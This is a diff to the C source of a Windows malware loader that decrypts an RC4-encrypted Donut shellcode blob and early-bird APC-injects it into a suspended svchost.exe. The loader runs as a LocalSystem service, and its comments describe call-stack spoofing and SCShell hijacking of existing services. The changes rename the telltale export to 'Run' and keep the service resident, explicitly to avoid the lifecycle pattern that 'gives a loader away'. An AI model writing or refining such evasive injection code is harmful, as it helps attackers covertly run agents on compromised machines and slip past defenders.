@@ -1,14 +1,14 @@
 /*
- * staged_loader (stage) - one-shot Windows service that early-bird injects an
+ * staged_loader (stage) - Windows service that early-bird injects an
  * RC4-encrypted Donut sRDI blob into a sacrificial process.
  *
  * This translation unit is compiled as an in-memory-only DLL: the stager
  * executable (stager.c) carries it RC4-encrypted, reflectively maps it, and
- * calls the exported StageMain() with the RC4-encrypted blob and key. Both
+ * calls the exported Run() with the RC4-encrypted blob and key. Both
  * the stage code and the shellcode reach memory only as RC4 ciphertext in
  * the stager's RCDATA resources; neither is a runnable PE on disk.
  *
- * StageMain() decrypts the blob and spawns the sacrificial process (default
+ * Run() decrypts the blob and spawns the sacrificial process (default
  * svchost.exe) suspended, then "early birds" it: the blob is written to a
  * fresh RW region in the child, flipped to RX, and queued as a user APC on
  * the suspended primary thread. When the thread is resumed the APC runs the
@@ -22,13 +22,20 @@
  * through the SilentMoonwalk desync spoofer so the call stack terminates in
  * kernel32!BaseThreadInitThunk instead of this module (see ../common/ntsys).
  *
- * The service is one-shot: it injects, verifies the child survived for a few
- * seconds, reports SERVICE_STOPPED and exits, leaving the sacrificial process
- * (and the agent inside it) running. Install/start/delete it with the
- * console commands below or with `sc`.
+ * The service behaves like an ordinary Windows service: it registers with
+ * the SCM, reports SERVICE_RUNNING once the injection is done, and stays
+ * resident until the SCM stops it. The agent runs in the sacrificial process
+ * independently, so the loader process just idles in between. Install/start/
+ * stop/delete it with the console commands below or with `sc`, or let
+ * something like SCShell point an existing own-process service at it.
+ *
+ * The service name is only a placeholder: the SCM ignores the dispatch-table
+ * name for SERVICE_WIN32_OWN_PROCESS services, so being started under an
+ * arbitrary name (SCShell swaps the ImagePath of, say, defragsvc) still
+ * registers and stops normally.
  *
  * Run from a console (i.e. StartServiceCtrlDispatcherW fails) the stager
- * acts as a small CLI, forwarding to StageMain:
+ * acts as a small CLI, forwarding to Run:
  *   stager.exe --install     register the service (LocalSystem, demand start)
  *   stager.exe --uninstall   remove the service
  *   stager.exe --start       start the service
@@ -81,7 +88,7 @@
 #define INJECT_DEBUG_CHILD 0
 #endif
 
-static wchar_t g_service_name[MAX_PATH]; /* exe basename, e.g. L"staged_loader" */
+static wchar_t g_service_name[MAX_PATH]; /* exe basename, e.g. L"host" */
 #ifndef STAGED_LOADER_NO_SERVICE
 static SERVICE_STATUS_HANDLE g_svc_handle = NULL;
 #endif
@@ -738,7 +745,10 @@ static void report_status(DWORD state, DWORD exit_code, DWORD checkpoint,
   memset(&ss, 0, sizeof(ss));
   ss.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
   ss.dwCurrentState = state;
-  ss.dwControlsAccepted = (state == SERVICE_RUNNING) ? SERVICE_ACCEPT_STOP : 0;
+  ss.dwControlsAccepted =
+      (state == SERVICE_RUNNING)
+          ? (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN)
+          : 0;
   ss.dwWin32ExitCode = exit_code;
   ss.dwCheckPoint = checkpoint;
   ss.dwWaitHint = wait_hint;
@@ -753,6 +763,7 @@ static DWORD WINAPI ctrl_handler(DWORD ctrl, DWORD evt_type, void *evt_data,
 
   switch (ctrl) {
   case SERVICE_CONTROL_STOP:
+  case SERVICE_CONTROL_SHUTDOWN:
     report_status(SERVICE_STOP_PENDING, NO_ERROR, 1, 30000);
     /* Kill the sacrificial process and let do_inject's poll loop notice the
      * stop event / dead child and perform its own handle cleanup. We never
@@ -794,10 +805,19 @@ static VOID WINAPI service_main(DWORD argc, LPWSTR *argv) {
     report_status(SERVICE_RUNNING, NO_ERROR, 0, 0);
     err = do_inject(payload, payload_len);
     free(payload);
+    /* Normal service lifecycle: after a successful injection stay resident
+     * and wait for the SCM to stop us. The agent already runs in the
+     * sacrificial process, so idling here costs nothing and avoids the
+     * one-shot START_PENDING -> RUNNING -> STOPPED pattern that gives a
+     * loader away. A stop that arrives during injection is reported as a
+     * clean stop by verify_child (ERROR_CANCELLED). */
+    if (err == ERROR_CANCELLED) {
+      err = NO_ERROR;
+    } else if (err == NO_ERROR && g_stop_event != NULL) {
+      WaitForSingleObject(g_stop_event, INFINITE);
+    }
   }
 
-  /* One-shot: report stopped and exit. The sacrificial process keeps the
-   * agent running on its own after we are gone. */
   report_status(SERVICE_STOPPED, err, 0, 0);
   if (g_stop_event != NULL) {
     CloseHandle(g_stop_event);
@@ -869,8 +889,8 @@ static int service_uninstall(void) {
   }
   if (ControlService(svc, SERVICE_CONTROL_STOP, &ss)) {
     LOG(L"service stopped");
-    /* Wait (up to 10 s) for the one-shot service to actually stop before
-     * deleting it; DeleteService fails while the service is still running. */
+    /* Wait (up to 10 s) for the service to actually stop before deleting it;
+     * DeleteService fails while the service is still running. */
     for (i = 0; i < 100; i++) {
       if (!QueryServiceStatus(svc, &ss)) {
         break;
@@ -913,8 +933,7 @@ static int service_start_stop(int start) {
       close_service_handles(scm, svc);
       return 1;
     }
-    LOG(L"service '%s' started (one-shot: it stops after injection)",
-        g_service_name);
+    LOG(L"service '%s' started", g_service_name);
   } else {
     if (!ControlService(svc, SERVICE_CONTROL_STOP, &ss)) {
       LOG(L"ControlService failed: %lu", GetLastError());
@@ -933,10 +952,10 @@ static void print_usage(void) {
 #ifdef DEBUG
 #ifndef STAGED_LOADER_NO_SERVICE
   /* Long-form help for debug/lab builds only. */
-  wprint(L"staged_loader (service: %s)\n"
+  wprint(L"usage (service: %s)\n"
          L"\n"
-         L"When started by the Service Control Manager this one-shot service\n"
-         L"runs the embedded payload in %s and then stops itself.\n"
+         L"When started by the Service Control Manager this service runs the\n"
+         L"embedded payload in %s and then stays resident until stopped.\n"
          L"\n"
          L"Console commands:\n"
          L"  --install      register '%s' (LocalSystem, demand start)\n"
@@ -957,13 +976,15 @@ static void print_usage(void) {
 
 /* ------------------------------------------------------------------- main */
 
-static void derive_service_name(void) {
+static int derive_service_name(void) {
   wchar_t *p;
   wchar_t *base;
 
+  /* Console mode (--install/--run) addresses the service by the module
+   * basename. When the SCM launches us as an own-process service the
+   * dispatch-table name is ignored, so this placeholder is fine there too. */
   if (GetModuleFileNameW(NULL, g_service_name, MAX_PATH) == 0) {
-    wcscpy(g_service_name, L"staged_loader");
-    return;
+    return -1;
   }
   base = g_service_name;
   for (p = g_service_name; *p != L'\0'; p++) {
@@ -979,17 +1000,17 @@ static void derive_service_name(void) {
   if (base != g_service_name) {
     memmove(g_service_name, base, (wcslen(base) + 1) * sizeof(wchar_t));
   }
+  return 0;
 }
 
 /*
- * StageMain is the stager's entry into the reflectively-mapped loader. The
- * stager owns argv and the blob/key buffers; they stay valid for the whole
- * call. argc counts the wide argv entries (argv[0] is the stager path).
+ * Run is the stager's entry into the reflectively-mapped loader. The stager
+ * owns argv and the blob/key buffers; they stay valid for the whole call.
+ * argc counts the wide argv entries (argv[0] is the stager path).
  */
 __declspec(dllexport) int __cdecl
-StageMain(int argc, wchar_t **argv, const unsigned char *enc_payload,
-          size_t enc_payload_len, const unsigned char *key,
-          size_t key_len) {
+Run(int argc, wchar_t **argv, const unsigned char *enc_payload,
+    size_t enc_payload_len, const unsigned char *key, size_t key_len) {
   int i;
 
   g_enc_payload = enc_payload;
@@ -997,7 +1018,9 @@ StageMain(int argc, wchar_t **argv, const unsigned char *enc_payload,
   g_key = key;
   g_key_len = key_len;
 
-  derive_service_name();
+  if (derive_service_name() != 0) {
+    return 1;
+  }
 
 #ifndef STAGED_LOADER_NO_SERVICE
   {
@@ -1056,11 +1079,11 @@ StageMain(int argc, wchar_t **argv, const unsigned char *enc_payload,
 }
 
 /*
- * Compile-time guard: if StageMain's signature ever drifts from the ABI the
- * stager resolves and calls (stage_abi.h), this assignment fails to compile.
+ * Compile-time guard: if Run's signature ever drifts from the ABI the stager
+ * resolves and calls (stage_abi.h), this assignment fails to compile.
  */
 static staged_loader_main_fn const g_stage_abi_check __attribute__((unused)) =
-    StageMain;
+    Run;
 
 /* Standard DLL entry point: the reflective loader calls this with
  * DLL_PROCESS_ATTACH to run the MinGW CRT init. */
